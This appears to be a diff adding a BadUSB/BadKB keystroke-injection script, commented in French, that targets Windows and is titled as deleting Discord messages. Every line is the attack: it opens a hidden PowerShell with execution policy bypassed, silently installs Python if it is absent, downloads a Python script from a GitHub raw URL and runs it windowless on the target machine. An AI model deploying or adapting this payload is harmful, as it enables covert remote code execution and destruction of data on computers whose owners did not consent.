@@ -1,0 +1,41 @@
+REM Title: Suppresion des messages discord
+REM Author: Traxxouu
+REM Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass
+ENTER
+DELAY 1000
+
+REM Vérifier si Python est installé
+STRING $pythonExists = Get-Command python -ErrorAction SilentlyContinue
+ENTER
+DELAY 500
+
+STRING if (-not $pythonExists) {
+ENTER
+STRING Start-Process -FilePath "msedge.exe" -ArgumentList "https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe" -Wait
+ENTER
+STRING Start-Sleep -s 10
+ENTER
+STRING Start-Process -FilePath "$env:USERPROFILE\Downloads\python-3.11.6-amd64.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+ENTER
+STRING Start-Sleep -s 30
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+REM Installer les bibliothèques requises
+STRING python -m pip install --upgrade pip customtkinter requests
+ENTER
+DELAY 5000
+
+REM Télécharger et exécuter le script depuis GitHub
+STRING irm "https://raw.githubusercontent.com/Traxxouu/BadKbTools/refs/heads/main/main.py" | Out-File "$env:USERPROFILE\Desktop\delete_discord.py"
+ENTER
+DELAY 2000
+
+STRING Start-Process pythonw -ArgumentList "$env:USERPROFILE\Desktop\delete_discord.py"
+ENTER
